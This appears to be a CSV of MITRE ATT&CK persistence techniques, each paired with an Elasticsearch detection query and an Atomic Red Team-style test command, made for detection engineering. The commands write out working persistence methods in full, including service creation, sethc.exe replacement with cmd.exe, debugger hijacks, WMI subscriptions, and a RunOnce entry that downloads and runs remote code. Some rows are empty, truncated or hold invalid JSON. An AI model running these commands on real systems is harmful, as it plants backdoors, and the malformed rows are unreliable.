T1037.001,"{
T1543.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": "" sc config""}},
                {""match_phrase"": {""CommandLine"": ""sc start""}}, 
                 {""match"": {""CommandLine"": ""-noexit""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","sc config Fax binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe 
-noexit -c \""write-host 'T1543.003 Test'\"""" && sc start Fax",2,,
T1543.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""delete""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                      
                    {""match_phrase"": {""CommandLine"": ""sc.exe create""}},
                {""match_phrase"": {""CommandLine"": ""sc.exe start""}} 
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",sc.exe create AtomicTestService_CMD binPath= 411da5_AtomicService.exe && sc.exe start AtomicTestService_CMD,2,,
T1543.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""New-Service""}},
                {""match_phrase"": {""CommandLine"": ""Start-Service""}}, 
                 {""match"": {""CommandLine"": ""-BinaryPathName""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Service -Name ""AtomicTestService_PowerShell"" -BinaryPathName ""411da5_AtomicService.exe""; Start-Service -Name ""AtomicTestService_PowerShell""",3,,
T1543.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""copy""}},
                {""wildcard"": {""CommandLine"": ""*dll""}},
                {""match_phrase"": {""CommandLine"": ""sc create""}},
                 {""match_phrase"": {""CommandLine"": ""sc config""}},
                  {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Svchost""}},
                  {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\W64Time\\Parameters""}},
                {""match_phrase"": {""CommandLine"": ""reg add""}},
                 {""match_phrase"": {""CommandLine"": ""sc start""}}  
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","copy $PathToAtomicsFolder\T1543.003\bin\w64time.dll %systemroot%\system32\ && sc create W64Time binPath= ""c:\Windows\System32\svchost.exe -k TimeService"" type= share start=auto 
&& sc config W64Time DisplayName= ""Windows 64 Time"" && sc description W64Time ""Maintain date and time synch on all clients and services in the network"" 
&& reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /t REG_MULTI_SZ /d ""W64Time"" /f 
&& reg add ""HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters"" /v ServiceDll /t REG_EXPAND_SZ /d ""%systemroot%\system32\w64time.dll"" /f && sc start W64Time",,,
T1546.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""assoc""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",assoc .hta=txtfile,2,,
T1546.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                  {""match_phrase"":{""CommandLine"": ""Control Panel\\Desktop""}},  
                   {""wildcard"":{""CommandLine"": ""reg*""}},
                   {""match"":{""CommandLine"": ""add""}}      
                ]
     }
    },
    {""bool"":{
     ""should"":[ 
                {""match_phrase"": {""CommandLine"": ""ScreenSaveActive""}},
                {""match_phrase"": {""CommandLine"": ""ScreenSaveTimeout""}},
                {""match_phrase"": {""CommandLine"": ""ScreenSaverIsSecure""}},
                {""match_phrase"": {""CommandLine"": ""SCRNSAVE.EXE""}}
                     ]
     }
    }
                 ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","copy C:\Windows\System32\cmd.exe ""%SystemRoot%\System32\evilscreensaver.scr""
 && reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f 
&& reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveTimeout /t REG_SZ /d 60 /f 
&& reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f 
&& reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\evilscreensaver.scr"" /f 
&& shutdown /r /t 0",2,,
T1546.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""TargetInstance.SystemUpTime""}},
                {""match_phrase"": {""CommandLine"": ""notepad.exe""}},
                {""match_phrase"": {""CommandLine"": "" New-CimInstance""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';                 
EventNameSpace='root\CimV2';                 
QueryLanguage=""WQL"";                
 Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""}; 
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; 
$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';                 
CommandLineTemplate=""$($Env:SystemRoot)\System32\notepad.exe"";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; 
$FilterToConsumerArgs = @{; Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; }; 
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs",2,,
T1546.007,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""add""}},
                 {""wildcard"": {""CommandLine"": ""*dll""}},
                {""wildcard"": {""CommandLine"": ""netsh*""}} 
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",c helper C:\Path\file.dll,,,
T1546.008,"
{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                  {""match_phrase"":{""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Image""}},  
                   {""wildcard"":{""CommandLine"": ""*trim""}},      
                ]
     }
    },
    {""bool"":{
     ""should"":[ 
                {""match_phrase"": {""CommandLine"": ""osk.exe""}},
                {""match_phrase"": {""CommandLine"": ""sethc.exe""}},
                {""match_phrase"": {""CommandLine"": ""utilman.exe""}},
                {""match_phrase"": {""CommandLine"": ""magnify.exe""}},
                 {""match_phrase"": {""CommandLine"": ""narrator.exe""}},
                 {""match_phrase"": {""CommandLine"": "" DisplaySwitch.exe""}},
                {""match_phrase"": {""CommandLine"": "" atbroker.exe""}}
                     ]
     }
    }
                 ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$input_table = ""osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"".split("",""); $Name = ""Debugger""; 
$Value = ""C:\windows\system32\cmd.exe""; 
Foreach ($item in $input_table){;   $item = $item.trim();   
$registryPath = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"";   
IF(!(Test-Path $registryPath));   {;     New-Item -Path $registryPath -Force;     New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force;   };   
ELSE;   {;     New-ItemProperty -Path $registryPath -Name $name -Value $Value;   }; }",2,,
T1546.008,"   {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""copy""}},
                {""match"": {""CommandLine"": ""icacls""}},
                {""match"": {""CommandLine"": ""takeown""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe 
&& takeown /F C:\Windows\System32\sethc.exe /A && icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t 
&& copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe",2,,
T1546.010,"            {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""reg*""}},
                 {""match"": {""CommandLine"": ""import""}},
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",reg.exe import e764f6_T1546.010.reg,,,
T1546.011,"                         {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""sdbinst*""}},
                {""wildcard"": {""CommandLine"": ""*sdb""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",sdbinst.exe 729b9b_AtomicShimx86.sdb,,,
T1546.011,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                {""wildcard"": {""CommandLine"": ""*.sdb""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",Copy-Item df9e44_T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb; Copy-Item df9e44_T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb,,2,
T1546.011,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}},
                   {""match_phrase"": {""CommandLine"": ""Windows NT\\CurrentVersion\\AppCompatFlags\\Custom""}},
                  {""match_phrase"": {""CommandLine"": ""Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB""}}

           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""; New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"" -Name ""AtomicRedTeamT",,2,
T1546.012,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"":{""CommandLine"": ""REG ADD""}},
                {""match_phrase"": {""CommandLine"": ""Windows NT\\CurrentVersion\\Image""}},
                {""match"": {""CommandLine"": ""Debugger""}},
                {""match"": {""CommandLine"": ""Options""}}
                            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v Debugger /d ""#{payload_binary}""",,2,
T1546.012,"
{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                  {""match_phrase"":{""CommandLine"": ""REG ADD""}},
                   {""match_phrase"":{""CommandLine"": ""Windows NT\\CurrentVersion""}},
                  
                          
                ]
     }
    },
    {""bool"":{
     ""should"":[ 
                {""match"": {""CommandLine"": ""GlobalFlag""}},
                {""match"": {""CommandLine"": ""MonitorProcess""}},
                {""match"": {""CommandLine"": ""ReportingMode""}}
                     ]
     }
    }
                 ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v GlobalFlag /t REG_DWORD /d 512 
&& REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v ReportingMode /t REG_DWORD /d 1 
&& REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v MonitorProcess /d ""#{payload_binary}""",2,,
T1546.013,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Add-Content""}},
                {""match_phrase"": {""CommandLine"": ""Start-Process""}},
                {""match"": {""CommandLine"": ""powershell""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Add-Content $profile -Value """"; Add-Content $profile -Value ""Start-Process calc.exe""; powershell -Command exit",2,,
T1546.015,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""New-Item""}},
                {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}},
                 {""match_phrase"": {""CommandLine"": ""Classes\\CLSID\\""}},
                {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'; New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Value $env:TEMP\AtomicTest.dll; New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType ""String""; Start-Process -FilePath ""C:\Windows\System32\RUNDLL32.EXE"" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'",,,
T1546.015,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*.Document.Application.ShellExecute""}},
                {""match_phrase"": {""CommandLine"": ""GetTypeFromCLSID""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(""9BA05972-F6A8-11CF-A442-00A0C90A8F39"")); $item = $o.Item(); $item.Document.Application.ShellExecute(""cmd.exe"",""/c calc.exe"",""C:\windows\system32"",$null,0)",2,,
T1547,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""add-driver""}},
                 {""wildcard"": {""CommandLine"": ""*.inf""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","pnputil.exe /add-driver ""C:\Windows\INF\usbstor.inf""",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""WScript.Shell""}},
                {""wildcard"": {""CommandLine"": ""*CreateShortcut""}},
                {""wildcard"": {""CommandLine"": ""*TargetPath""}},
                 {""wildcard"": {""CommandLine"": ""calc*""}},
                 {""wildcard"": {""CommandLine"": ""*.Save""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$Target = ""C:\Windows\System32\calc.exe""; 
$ShortcutLocation = ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk""; 
$WScriptShell = New-Object -ComObject WScript.Shell; 
$Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""REG ADD""}},
                 {""match_phrase"": {""CommandLine"": ""shell\\open\\command""}}
               ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""set-itemproperty""}},
                 {""match"": {""CommandLine"": ""IEX""}},
                {""wildcard"": {""CommandLine"": ""*.bat""}}
               ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$RunOnceKey = ""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce""; set-itemproperty $RunOnceKey ""NextRun"" 'powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`"")""'",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""REG ADD""}},
                {""wildcard"": {""CommandLine"": ""*.exe""}},
                 {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\CurrentVersion\\Run""}}
               ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe""",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""REG ADD""}},
                
                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\CurrentVersion""}},
                {""wildcard"": {""CommandLine"": ""*.dll""}}
              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll""",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                 {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\Start Menu\\Programs\\Startup""}},
                {""wildcard"": {""CommandLine"": ""*.bat""}},
                {""match_phrase"":{""CommandLine"": ""Start-Process""}}
              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Copy-Item bea90a_batstartup.bat ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""; 
Copy-Item bea90a_batstartup.bat ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""; 
Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""; 
Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                  {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\Start Menu\\Programs\\Startup""}},
                {""wildcard"": {""CommandLine"": ""*jse""}},
                {""wildcard"": {""CommandLine"": ""cscript*""}}
              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Copy-Item d2a901_jsestartup.jse ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""; 
Copy-Item d2a901_jsestartup.jse ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"";
 cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""; 
cscript.exe /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""",2,,
T1547.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\Start Menu\\Programs\\Startup""}},
                {""wildcard"": {""CommandLine"": ""*vbs""}},
                {""wildcard"": {""CommandLine"": ""cscript*""}}
              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Copy-Item b6dec5_vbsstartup.vbs ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"";
Copy-Item b6dec5_vbsstartup.vbs ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""; 
cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"";
 cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""",2,,
